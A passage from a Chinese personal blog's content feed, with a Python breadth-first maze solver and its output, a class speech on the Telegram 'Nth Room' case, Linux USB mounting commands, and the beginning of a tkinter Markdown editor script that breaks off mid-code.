<span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">                    <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                        <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                            map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                        <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                        current = trace</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                    print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">            j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">            <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">            condition = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">                <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                    condition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在实现的过程中，我遇到了一些问题：</p><ul>    <li>由于对Python中类的使用不熟练，导致代码中有关部分看起来很奇怪</li>    <li>在遍历当前节点周围的有效节点时，没有重新初始化节点，而是直接将当前节点周围有效节点的坐标加入边界，导致循环从第二次开始就无法进行，因为坐标没有“周围的有效节点”这个属性</li>    <li>在将以探索过的节点加入对应数据结构后，检查下一个节点是否在此数据结构时直接使用“==”，但是即使坐标相同的两个节点也可能不相等，原因是这两个节点存在于不同的地址，正确的做法是再遍历一遍存储以探索过的数据结构，直接比较此数据结构中节点的坐标值</li></ul><p>在完成初步的实现后，处于对代码重构的要求，对代码做了相关的函数封装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">map_show</span>(<span class="params">map1</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">map_show(map1)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">route_trace</span>(<span class="params">current,explored</span>):</span></span><br><span class="line">    <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                    map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                current = trace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">frontier,explored,current</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">        j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">        <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">        condition = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                condition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            route_trace(current,explored)</span><br><span class="line">            map_show(map1)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        action(frontier,explored,current)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Got it!</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . . . . B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">          .         </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">A . . . . . <span class="comment"># # # # </span></span><br></pre></td></tr></table></figure><p>现在，这个程序已经能够找出各种迷宫地图的解法了，也就是说，如果我们对地图进行修改，程序也能够正常运行并输出相应结果，比如，我们将地图的唯一道路“封死”，那么结果就会是“No result”，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A     <span class="comment">#     # # # # </span></span><br><span class="line"></span><br><span class="line">No result</span><br></pre></td></tr></table></figure><p>至此，我们就完成了对此情境下相关代码的编写。</p><p>修改于2021.04.11</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>来自班级组织演讲的一篇演讲稿</title>
      <link href="2021/04/10/Speech/"/>
      <url>2021/04/10/Speech/</url>
      
        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>地狱空荡荡 恶魔在人间</p><p>想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度<br>主要人物介绍：<a id="more"></a><br>赵主彬：现年25岁，信息通信专业，曾担任学报编辑部编辑。多次获得奖学金。3年内参加了50多次志愿活动。<br>就是这么一个表面人畜无害的优秀学生，主导了这么一起事件。<br>对此人进行分析，我们不难得出：平台用telegram，交易用比特币，说明罪犯反侦查意识高，思维敏捷，可以归类为高智商信息犯罪；内心自卑，但是外围性格特征表现为自负，因无法达到自身的高度预期郁不得志，因此可能存在社会偏见，有一定概率发展为反社会型人格；可能存在家庭暴力，且是父权家庭；社交能力较差，排斥甚至仇视女性，这点可以从他在被捕后的言论发表矢口不谈对女性的道歉这一点可以看出。</p><p>有的孩子是孩子，有的孩子是禽兽<br>这十几年都塞了什么进脑子里<br>人名不打码，马赛克做错了什么</p><p>就像这些评论所表述的一样，我也痛恨这些精虫上脑的东西。但是几乎一边倒的网络舆论显然有些问题：这26万人个个都罪该万死吗？考虑到涉案人数及案件的复杂程度，我个人觉得其中还是不乏被教唆的，受蒙骗的，甚至不明情况的。不是说强行洗白，而是我认为每个人看待事情都应该有自己的看法，有那种不被舆论大势所动摇的那种看法。<br>大家是否看过这样一个比喻：韩国目前在运营的出租车大概有26万辆，这意味着在韩国的大街上，遇到N号房会员就像遇到出租车一样频繁。<br>不知各位对这个比喻有什么看法<br>在我看来，这是一种下意识的情景描绘，旨在放大案件涉及的范围，而这种情景描绘于我来看除了放大恐慌之外没有任何用处，那他们这么做的目的何在呢？要我说要不就是公众号博人眼球，要不就涉及到黑公关带节奏，由于这是一个国家级的案件，比起背后大到令人无法想象的黑灰产业链，我还是更倾向于前者。</p><p>最后，引用了几句某些公众号的评价作为我对此事的看法，话很粗，但理不粗：<br>作为一个成年人，要学会克制，不该馋的不要馋。<br>我知道现在是春天，但只有野狗才不分场合、不分对象，时刻想着交配。<br>何况，野狗也只在春秋两季才发情</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>由于班级组织的演讲限时3分钟，所以我不得不把原本一千多字的演讲稿删为800多字，也因此缺失了很多事件的细节及个人的观点。<br>–2020.05.07</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux下利用命令行对U盘和电脑中的文件进行操作</title>
      <link href="2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/"/>
      <url>2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l<span class="comment">#查看接入设备名称</span></span><br><span class="line">mount /dev/sda1 /mnt <span class="comment">#挂载U盘</span></span><br><span class="line">ls /mnt<span class="comment">#查看U盘文件</span></span><br><span class="line">cp file directory<span class="comment">#复制指定文件file至指定目录directory</span></span><br><span class="line">ls /mnt<span class="comment">#再次查看U盘文件</span></span><br><span class="line">umount /mnt<span class="comment">#卸载U盘</span></span><br></pre></td></tr></table></figure><div class="note "><p><strong>标题（可选）</strong></p><p>提示：<br>若操作中出现错误，请查看权限是否正确，或在每次操作前加’sudo’<br>cp后的文件和路径需带路径(个人推荐绝对路径)</p></div>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown_Editor V1.0</title>
      <link href="2021/04/10/Markdown_Editor%20V1.0/"/>
      <url>2021/04/10/Markdown_Editor%20V1.0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line">import tkinter</span><br><span class="line">import os</span><br><span class="line">from tkinter import filedialog</span><br><span class="line"></span><br><span class="line">win_size=<span class="string">&#x27;450x550&#x27;</span></span><br><span class="line">win = tkinter.Tk()</span><br><span class="line">win.geometry(win_size)</span><br><span class="line"></span><br><span class="line">win.title(<span class="string">&#x27;Markdown Editor V1.0 (hexo only)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def processandsave():</span><br><span class="line">   contents = <span class="string">&#x27;---\ntitle:&#x27;</span> + title.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;tags:&#x27;</span> + tags.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;---\n&#x27;</span> + content.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">   filename = filedialog.asksaveasfilename()</span><br><span class="line">   <span class="keyword">if</span> filename is not None:</span><br><span class="line">       with open(file=filename,mode=<span class="string">&#x27;w&#x27;</span>) as file:</span><br><span class="line">           file.write(str(contents))</span><br><span class="line">           title.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           tags.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           content.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def add_bash():</span><br><span class="line">    add_content=add_bash_text.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    add_content=add_content.rstrip()</span><br><span class="line">    changing_content=<span class="string">&#x27;```bash\n&#x27;</span>+add_content+<span 